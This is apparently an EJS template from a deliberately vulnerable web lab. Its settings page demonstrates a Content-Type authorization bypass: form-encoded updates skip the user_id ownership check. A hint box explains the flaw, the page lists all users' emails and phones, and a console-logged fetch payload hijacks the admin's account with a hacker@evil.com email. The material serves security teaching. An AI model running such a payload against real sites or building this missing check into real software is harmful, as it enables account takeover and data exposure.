<div class="space-y-8 animate-fadeIn max-w-5xl mx-auto py-8">
    <div>
        <h1 class="text-4xl font-black text-gray-900 mb-2">⚙️ Account Settings</h1>
        <p class="text-gray-500">Manage your profile settings and preferences</p>
    </div>

    <% if (typeof success !== 'undefined' && success) { %><div class="bg-green-50 border-l-4 border-green-500 text-green-700 p-4 rounded-xl"><span>✅</span> <%= success %></div><% } %>
    <% if (typeof error !== 'undefined' && error) { %><div class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 rounded-xl"><span>❌</span> <%= error %></div><% } %>

    <!-- Your Settings -->
    <div class="bg-white rounded-2xl shadow-lg p-8 border border-gray-100">
        <h2 class="text-2xl font-black text-gray-900 mb-6">👤 Your Settings</h2>
        
        <div class="bg-gray-50 rounded-xl p-5 mb-6">
            <div class="grid grid-cols-2 gap-4 text-sm">
                <div><span class="text-gray-500">Display Name:</span> <strong><%= settings.display_name || 'Not set' %></strong></div>
                <div><span class="text-gray-500">Email:</span> <strong><%= settings.email || 'Not set' %></strong></div>
                <div><span class="text-gray-500">Phone:</span> <strong><%= settings.phone || 'Not set' %></strong></div>
                <div><span class="text-gray-500">Theme:</span> <strong class="capitalize"><%= settings.theme || 'light' %></strong></div>
                <div><span class="text-gray-500">2FA:</span> <strong><%= settings.two_factor_enabled ? '✅ Enabled' : '❌ Disabled' %></strong></div>
            </div>
        </div>

        <!-- Update Form -->
        <form id="settings-form" class="space-y-4">
            <input type="hidden" id="form-user-id" value="<%= user.id %>">
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label class="block text-sm font-bold text-gray-700 mb-2">📛 Display Name</label>
                    <input type="text" id="display-name" class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-indigo-500 outline-none transition" placeholder="Your name" value="<%= settings.display_name || '' %>">
                </div>
                <div>
                    <label class="block text-sm font-bold text-gray-700 mb-2">✉️ Email</label>
                    <input type="email" id="email" class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-indigo-500 outline-none transition" placeholder="you@example.com" value="<%= settings.email || '' %>">
                </div>
            </div>
            <div>
                <label class="block text-sm font-bold text-gray-700 mb-2">📱 Phone</label>
                <input type="tel" id="phone" class="w-full px-4 py-3 border-2 border-gray-200 rounded-xl focus:border-indigo-500 outline-none transition" placeholder="+1555123456" value="<%= settings.phone || '' %>">
            </div>
            <div class="flex gap-4">
                <button type="button" onclick="updateWithJSON()" class="px-6 py-3 bg-indigo-600 text-white rounded-xl font-bold hover:bg-indigo-700 transition text-sm">
                    💾 Save (JSON)
                </button>
                <button type="button" onclick="updateWithForm()" class="px-6 py-3 bg-purple-600 text-white rounded-xl font-bold hover:bg-purple-700 transition text-sm">
                    💾 Save (Form-Encoded)
                </button>
            </div>
        </form>
    </div>

    <!-- All Users Settings (for testing) -->
    <div class="bg-white rounded-2xl shadow-lg p-8 border border-gray-100">
        <h2 class="text-2xl font-black text-gray-900 mb-6">📋 All User Settings</h2>
        <div class="overflow-x-auto">
            <table class="w-full text-sm">
                <thead><tr class="bg-gray-100"><th class="py-2 px-3 text-left">ID</th><th class="py-2 px-3 text-left">Username</th><th class="py-2 px-3 text-left">Display Name</th><th class="py-2 px-3 text-left">Email</th><th class="py-2 px-3 text-left">Phone</th></tr></thead>
                <tbody class="divide-y divide-gray-100">
                    <% allSettings.forEach(function(s) { %>
                    <tr class="hover:bg-gray-50">
                        <td class="py-2 px-3 font-mono text-xs"><%= s.user_id %></td>
                        <td class="py-2 px-3 font-bold"><%= s.username %></td>
                        <td class="py-2 px-3"><%= s.display_name %></td>
                        <td class="py-2 px-3 font-mono text-xs"><%= s.email %></td>
                        <td class="py-2 px-3 font-mono text-xs"><%= s.phone %></td>
                    </tr>
                    <% }); %>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Test Console -->
    <div class="bg-gray-900 rounded-2xl shadow-lg p-6 text-white">
        <h3 class="font-bold text-green-400 mb-3">🧪 Test Console</h3>
        <div id="console-output" class="space-y-2 text-sm font-mono max-h-60 overflow-y-auto"></div>
    </div>

    <!-- Hint -->
    <div class="bg-amber-50 border border-amber-200 rounded-2xl p-5 flex gap-3">
        <span class="text-2xl">💡</span>
        <div>
            <h4 class="font-bold text-amber-800 mb-1">Content-Type Bypass Hint</h4>
            <p class="text-amber-700 text-sm">
                JSON requests check if <code class="bg-amber-100 px-1 py-0.5 rounded font-mono text-xs">user_id</code> matches your session. 
                But <strong>form-urlencoded</strong> requests don't! Try changing the Content-Type and see what happens...
            </p>
        </div>
    </div>
</div>

<script>
function log(msg, color = 'text-green-400') {
    const out = document.getElementById('console-output');
    out.innerHTML += `<p class="${color}">${msg}</p>`;
    out.scrollTop = out.scrollHeight;
}

// ✅ JSON - Authorization کار می‌کنه (403 for other users)
async function updateWithJSON() {
    const userId = parseInt(document.getElementById('form-user-id').value);
    const email = document.getElementById('email').value;
    const name = document.getElementById('display-name').value;
    const phone = document.getElementById('phone').value;

    log('▶️ Trying JSON (Content-Type: application/json)...', 'text-blue-400');
    log(`Body: {"user_id": ${userId}, "email": "${email}"}`, 'text-gray-400');

    try {
        const r = await fetch('/api/user/update', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user_id: userId, email, display_name: name, phone })
        });
        const d = await r.json();
        log(`📥 Status: ${r.status} | ${d.message}`, r.status === 403 ? 'text-red-400' : 'text-green-400');
        
        if (d.success) location.reload();
    } catch (e) {
        log('❌ Error: ' + e.message, 'text-red-400');
    }
}

// ❌ Form-Encoded - Authorization کار نمی‌کنه!
async function updateWithForm() {
    const userId = parseInt(document.getElementById('form-user-id').value);
    const email = document.getElementById('email').value;
    const name = document.getElementById('display-name').value;
    const phone = document.getElementById('phone').value;

    log('▶️ Trying form-urlencoded (Content-Type: application/x-www-form-urlencoded)...', 'text-yellow-400');
    log(`Body: user_id=${userId}&email=${email}`, 'text-gray-400');

    try {
        const r = await fetch('/api/user/update', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `user_id=${userId}&email=${encodeURIComponent(email)}&display_name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`
        });
        const d = await r.json();
        log(`📥 Status: ${r.status} | ${d.message}`, d.success ? 'text-green-400' : 'text-red-400');
        
        if (d.success) location.reload();
    } catch (e) {
        log('❌ Error: ' + e.message, 'text-red-400');
    }
}

// 💉 هشدار: کاربر می‌تونه مستقیماً از Console تست کنه!
console.log('💉 Try this in Console to hijack admin settings:');
console.log(`fetch('/api/user/update', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'user_id=4&email=hacker@evil.com&display_name=HACKED&phone=+19999999999'
}).then(r=>r.json()).then(console.log)`);
</script>